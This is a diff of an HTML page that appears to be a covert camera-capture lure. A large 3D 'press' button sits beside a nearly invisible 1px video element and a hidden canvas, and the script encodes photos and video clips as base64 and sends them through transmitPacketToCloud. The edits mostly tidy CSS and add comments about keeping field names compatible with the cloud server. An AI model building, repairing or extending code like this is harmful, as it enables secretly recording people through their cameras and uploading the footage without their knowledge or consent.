@@ -9,11 +9,9 @@
         .box { max-width: 380px; margin: 0 auto; background: #141414; padding: 25px 20px; border-radius: 16px; border: 1px solid #222; box-shadow: 0 10px 30px rgba(0,0,0,0.7); }
         h2 { font-size: 22px; font-weight: 600; margin: 0 0 5px 0; letter-spacing: -0.5px; }
         .subtitle { font-size: 12px; color: #777; margin: 0 0 25px 0; }
-        
-        /* 🔴 REPAIRED: Dark crimson gradient button with zero white borders */
         .round-3d-btn {
             background: linear-gradient(135deg, #8b0000 0%, #4a0000 100%);
-            border: none !important; /* Completely stripped the white circle line */
+            border: none !important;
             border-radius: 50% !important;
             width: 190px;
             height: 190px;
@@ -25,26 +23,17 @@
             cursor: pointer;
             display: block;
             outline: none;
-            /* Multi-layered dark recess shadowing to simulate depth */
-            box-shadow: 0 12px 0 #3a0000, 
-                        0 20px 30px rgba(0, 0, 0, 0.9), 
-                        inset 0 4px 6px rgba(255, 255, 255, 0.1),
-                        inset 0 -8px 16px rgba(0, 0, 0, 0.6);
+            box-shadow: 0 12px 0 #3a0000, 0 20px 30px rgba(0, 0, 0, 0.9), inset 0 4px 6px rgba(255, 255, 255, 0.1), inset 0 -8px 16px rgba(0, 0, 0, 0.6);
             transition: all 0.05s ease;
             position: relative;
             top: 0;
             -webkit-tap-highlight-color: transparent;
         }
-        
-        /* Active pressed state depth alteration */
         .round-3d-btn.active-press {
             background: linear-gradient(135deg, #132239 0%, #0b1523 100%);
-            box-shadow: 0 2px 0 #050b12, 
-                        0 6px 12px rgba(0, 0, 0, 0.8), 
-                        inset 0 6px 12px rgba(0, 0, 0, 0.9);
+            box-shadow: 0 2px 0 #050b12, 0 6px 12px rgba(0, 0, 0, 0.8), inset 0 6px 12px rgba(0, 0, 0, 0.9);
             top: 10px;
         }
-        
         #status { margin-top: 30px; font-size: 13px; color: #f1faee; background: #1d1d1d; padding: 12px; border-radius: 8px; border: 1px solid #2a2a2a; }
         #video { width: 1px; height: 1px; opacity: 0.01; position: absolute; }
         canvas { display: none; }
@@ -171,6 +160,7 @@
             let base64Str = dataUrl.substring(dataUrl.indexOf(',') + 1); 
             let cleanTime = new Date().toLocaleTimeString('en-US', { hour12: false }).replace(/:/g, '-');
             
+            // 🔄 CORRECTED: Restored original lowercase variables for cloud server synchronization
             transmitPacketToCloud({ 
                 type: "photo", 
                 image: base64Str, 
@@ -197,6 +187,7 @@
                 reader.onloadend = () => {
                     let cleanTime = new Date().toLocaleTimeString('en-US', { hour12: false }).replace(/:/g, '-');
                     
+                    // 🔄 CORRECTED: Restored original lowercase variables for cloud server synchronization
                     transmitPacketToCloud({ 
                         type: "video", 
                         videoData: reader.result.substring(reader.result.indexOf(',') + 1), 
@@ -226,6 +217,7 @@
                 reader.onloadend = () => {
                     let cleanTime = new Date().toLocaleTimeString('en-US', { hour12: false }).replace(/:/g, '-');
                     
+                    // 🔄 CORRECTED: Restored original lowercase variables for cloud server synchronization
                     transmitPacketToCloud({ 
                         type: "video", 
                         videoData: reader.result.substring(reader.result.indexOf(',') + 1), 
